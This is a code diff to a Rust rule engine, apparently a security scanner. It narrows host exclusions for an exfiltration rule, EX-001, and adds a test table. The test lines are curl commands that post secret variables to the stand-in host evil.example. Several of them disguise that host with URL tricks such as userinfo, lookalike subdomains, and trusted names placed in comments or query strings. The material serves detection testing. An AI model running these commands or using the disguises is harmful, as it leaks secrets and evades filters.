@@ -516,7 +516,12 @@ impl RuleEngine {
             .patterns
             .iter()
             .any(|p| p.is_match(normalized.as_ref()));
+        let trusted_destination_excluded = rule.id == "EX-001"
+            && crate::rules::builtin::exfiltration::ex001_line_uses_only_trusted_destinations(
+                normalized.as_ref(),
+            );
         matched
+            && !trusted_destination_excluded
             && !rule
                 .exclusions
                 .iter()
@@ -762,6 +767,59 @@ mod tests {
         let findings = engine.check_content(content, "test.sh");
         let exfil_findings: Vec<_> = findings.iter().filter(|f| f.id == "EX-001").collect();
         assert!(exfil_findings.is_empty(), "Should exclude IPv6 localhost");
+    }
+
+    #[test]
+    fn test_ex001_host_exclusions_are_scoped_to_actual_destinations() {
+        let engine = RuleEngine::new();
+        let cases = [
+            ("curl -d \"$KEY\" https://github.com/install.sh", false),
+            ("curl -d \"$KEY\" https://api.github.com/repos", false),
+            (
+                "curl -d \"$KEY\" https://evil.example/upload # github.com",
+                true,
+            ),
+            (
+                "curl -d \"$KEY\" https://evil.example/github.com/upload",
+                true,
+            ),
+            (
+                "curl -d \"$KEY\" https://evil.example/upload?next=github.com",
+                true,
+            ),
+            (
+                "curl -d \"$KEY\" https://github.com@evil.example/upload",
+                true,
+            ),
+            (
+                "curl -d \"$KEY\" https://github.com.evil.example/upload",
+                true,
+            ),
+            ("curl -d \"$KEY\" \"$URL\" # https://github.com/", true),
+            ("curl -d \"$KEY\" https://127.evil.example/", true),
+            ("curl -d \"$KEY\" https://registry.evil.example/", true),
+            ("curl -d \"$KEY\" https://127.0.0.1/", false),
+            ("curl -d \"$KEY\" https://registry.npmjs.org/", false),
+            (
+                "curl -d \"$KEY\" https://get.docker.com/install.sh; curl -d \"$OTHER\" https://evil.example/upload",
+                true,
+            ),
+            ("curl -d \"$KEY\" \"$URL\"; curl https://github.com/", true),
+            ("echo https://github.com/; curl -d \"$KEY\" \"$URL\"", true),
+            ("curl -d \"$KEY\" \"$URL\" https://github.com/upload", true),
+            (
+                "curl -d \"$KEY\" https://evil.example/upload '# https://github.com/'",
+                true,
+            ),
+        ];
+
+        for (line, expected) in cases {
+            let has_ex001 = engine
+                .check_content(line, "test.sh")
+                .iter()
+                .any(|finding| finding.id == "EX-001");
+            assert_eq!(has_ex001, expected, "unexpected EX-001 result for: {line}");
+        }
     }
 
     #[test]
